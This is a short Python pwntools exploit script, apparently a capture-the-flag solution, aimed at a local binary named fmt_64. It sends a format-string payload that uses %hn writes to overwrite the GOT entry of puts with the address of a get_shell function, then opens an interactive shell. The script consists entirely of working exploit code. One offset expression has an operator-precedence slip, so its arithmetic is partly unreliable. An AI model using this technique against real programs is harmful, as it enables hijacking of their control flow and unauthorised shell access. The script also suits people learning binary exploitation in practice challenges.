from pwn import *
context.log_level="debug"

io = process('./fmt_64')
elf = ELF('./fmt_64')
puts_got = elf.got['puts']
get_shell_addr = elf.symbols['get_shell']
id_addr = elf.symbols['id']

def change_addr():
    target_addr = b""
    target_addr += p64(puts_got + 4)
    target_addr += p64(puts_got + 2)
    target_addr += p64(id_addr)
    target_addr += p64(puts_got)
    payload = b""
    payload += b"%34$hn"
    payload += b"%" + str((get_shell_addr >> 16) & 0xffff - 6).encode() + b"c"
    payload += b"%35$hn"
    payload += b"%" + str(1234- ((get_shell_addr >> 16) & 0xffff)).encode() + b"c"
    payload += b"%36$hn"
    payload += b"%" + str((get_shell_addr & 0xffff) - 1234).encode() + b"c"
    payload += b"%37$hn"
    payload += b"B"*(256 - len(payload) - len(target_addr))
    payload += target_addr
    io.sendline(payload)

io.recvuntil(b"You can type exactly 256 charecters ...\n")
change_addr()
io.interactive()
